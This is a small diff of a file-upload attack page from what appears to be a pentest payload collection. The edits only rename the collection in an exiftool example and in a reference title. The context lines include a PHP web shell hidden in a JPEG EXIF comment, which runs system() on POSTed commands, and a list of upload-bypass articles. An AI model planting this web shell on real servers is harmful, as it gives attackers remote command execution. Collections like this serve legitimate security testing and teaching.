@@ -195,7 +195,7 @@ Create a custom picture and insert exif tag with `exiftool`. A list of multiple 
 
 ```ps1
 convert -size 110x110 xc:white payload.jpg
-exiftool -Copyright="this collection" -Artist="Pentest" -ImageUniqueID="Example" payload.jpg
+exiftool -Copyright="payloads" -Artist="Pentest" -ImageUniqueID="Example" payload.jpg
 exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler;" img.jpg
 ```
 
@@ -393,7 +393,7 @@ More payloads in the folder `CVE FFmpeg HLS/`.
 * [BookFresh Tricky File Upload Bypass to RCE - Ahmed Aboul-Ela - November 29, 2014](http://web.archive.org/web/20141231210005/https://secgeek.net/bookfresh-vulnerability/)
 * [Bulletproof Jpegs Generator - Damien Cauquil (@virtualabs) - April 9, 2012](https://web.archive.org/web/20130606125954/http://www.virtualabs.fr/Nasty-bulletproof-Jpegs-l)
 * [Encoding Web Shells in PNG IDAT chunks - phil - April 6, 2012](https://web.archive.org/web/20120610205435/http://www.idontplaydarts.com:80/2012/06/encoding-web-shells-in-png-idat-chunks)
-* [File Upload - this collection - July 20, 2024](
+* [File Upload - payloads - July 20, 2024](
 * [File Upload and PHP on IIS: >=? and <=* and "=. - Soroush Dalili (@irsdl) - July 23, 2014](https://web.archive.org/web/20231003035528/https://soroush.me/blog/2014/07/file-upload-and-php-on-iis-wildcards/)
 * [File Upload restrictions bypass - Haboob Team - July 24, 2018](https://web.archive.org/web/20180724174319/https://www.exploit-db.com/docs/english/45074-file-upload-restrictions-bypass.pdf)
 * [IIS - SOAP - Navigating The Shadows - 0xbad53c - May 19, 2024](https://web.archive.org/web/20220404084558/https://red.0xbad53c.com/red-team-operations/initial-access/webshells/iis-soap)
